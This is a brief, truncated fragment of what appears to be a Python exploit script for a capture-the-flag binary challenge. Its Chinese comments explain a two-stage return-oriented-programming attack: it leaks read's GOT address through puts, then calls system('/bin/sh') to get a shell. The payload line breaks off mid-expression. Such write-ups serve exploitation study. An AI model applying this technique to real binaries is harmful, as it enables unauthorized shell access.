...
def stageone():
#pop_rdi后紧接read_got，就把read_got传入了rdi，作为参数
#上一行执行ret的时候就跳转到puts_plt，执行到现在就类似于执行了一个puts(read_got)
...
def stagetwo():
#将bss的地址即/bin/sh字符串的地址传给rdi作为第一个参数，然后直接执行system，就相当于执行了system("/bin/sh")，然后getshell
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(bss) \
